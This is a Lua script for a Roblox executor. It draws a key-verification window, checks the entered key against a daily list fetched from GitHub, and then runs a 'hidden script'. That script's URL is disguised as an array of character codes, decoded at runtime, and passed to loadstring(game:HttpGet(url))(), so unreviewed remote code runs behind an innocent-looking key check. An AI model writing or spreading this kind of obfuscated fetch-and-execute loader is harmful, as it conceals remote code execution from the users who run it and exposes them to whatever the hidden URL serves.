local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- Удаляем старый GUI
local oldGui = CoreGui:FindFirstChild("PlayerokKeyGui")
if oldGui then oldGui:Destroy() end

-- Ключи
local keysURL = "https://raw.githubusercontent.com/RobloxScriptKey/MilediKeys-/main/MILEDI-keys.json"
local success, response = pcall(function() return game:HttpGet(keysURL) end)
local keys = success and HttpService:JSONDecode(response) or {}
local today = os.date("%Y-%m-%d")
local todayKeyTable = keys[today]
local validKey
if todayKeyTable then
    validKey = ""
    for _, v in ipairs(todayKeyTable) do
        validKey = validKey .. string.char(v)
    end
end

-- GUI
local gui = Instance.new("ScreenGui", CoreGui)
gui.Name = "PlayerokKeyGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 0, 0, 0)
frame.Position = UDim2.new(0.5, 0, 0.4, 0)
frame.AnchorPoint = Vector2.new(0.5, 0.5)
frame.BackgroundColor3 = Color3.fromRGB(120, 140, 255)
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 60)
title.BackgroundTransparency = 1
title.Text = "🔐 Введите ключ"
title.TextColor3 = Color3.new(1,1,1)
title.Font = Enum.Font.GothamBold
title.TextSize = 22

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.8,0,0,36)
box.Position = UDim2.new(0.1,0,0,110)
box.PlaceholderText = "Вставьте ключ..."
box.Font = Enum.Font.Gotham
box.TextSize = 20
box.TextColor3 = Color3.fromRGB(50,50,50)
box.BackgroundColor3 = Color3.fromRGB(230,230,255)
Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8,0,0,40)
button.Position = UDim2.new(0.1,0,0,160)
button.BackgroundColor3 = Color3.fromRGB(160,200,255)
button.Font = Enum.Font.GothamBold
button.TextSize = 20
button.TextColor3 = Color3.fromRGB(30,30,30)
button.Text = "Проверить"
Instance.new("UICorner", button).CornerRadius = UDim.new(0,12)

local feedback = Instance.new("TextLabel", frame)
feedback.Size = UDim2.new(1,0,0,20)
feedback.Position = UDim2.new(0,0,0,145)
feedback.BackgroundTransparency = 1
feedback.Text = ""
feedback.TextColor3 = Color3.new(1,1,1)
feedback.Font = Enum.Font.Gotham
feedback.TextSize = 18

-- Прогресс-бар
local progressBackground = Instance.new("Frame", frame)
progressBackground.Size = UDim2.new(0.8,0,0,20)
progressBackground.Position = UDim2.new(0.1,0,0,210)
progressBackground.BackgroundColor3 = Color3.fromRGB(200,200,255)
Instance.new("UICorner", progressBackground).CornerRadius = UDim.new(0,10)

local progressBar = Instance.new("Frame", progressBackground)
progressBar.Size = UDim2.new(0,0,1,0)
progressBar.BackgroundColor3 = Color3.fromRGB(30,200,30)
Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0,10)

-- Скрытый скрипт (URL закодирован)
local scriptURLnums = {104,116,116,112,115,58,47,47,103,105,115,116,46,103,105,116,104,117,98,117,115,101,114,99,111,109,47,85,67,84,45,104,117,98,47,53,98,49,49,100,49,48,51,56,54,102,49,98,56,99,101,48,56,102,101,98,56,48,51,56,54,49,101,48,98,55,57,47,114,97,119,47,98,50,57,49,55,98,51,57,56,100,52,98,48,99,99,56,48,102,98,50,97,99,97,55,51,97,51,49,51,55,98,97,52,57,52,101,98,99,102,48,10}
local function runHidden()
    local url = ""
    for _, n in ipairs(scriptURLnums) do
        url = url .. string.char(n)
    end
    local success, err = pcall(function()
        loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Ошибка запуска скрытого скрипта: ", err)
    end
end

-- Анимация
TweenService:Create(frame, TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out), {Size = UDim2.new(0,400,0,260)}):Play()

-- Проверка ключа
button.MouseButton1Click:Connect(function()
    local input = box.Text:match("^%s*(.-)%s*$")
    if validKey and input == validKey then
        feedback.Text = "✅ Ключ верный, загружаем..."
        feedback.TextColor3 = Color3.fromRGB(30,200,30)
        -- Прогресс-бар
        local startTime = tick()
        local conn
        conn = RunService.RenderStepped:Connect(function()
            local elapsed = tick() - startTime
            local pct = math.clamp(elapsed/2,0,1)
            progressBar.Size = UDim2.new(pct,0,1,0)
            if pct>=1 then
                conn:Disconnect()
                gui:Destroy()
                runHidden()
            end
        end)
    else
        feedback.Text = "❌ Неверный ключ"
        feedback.TextColor3 = Color3.fromRGB(200,40,40)
    end
end)
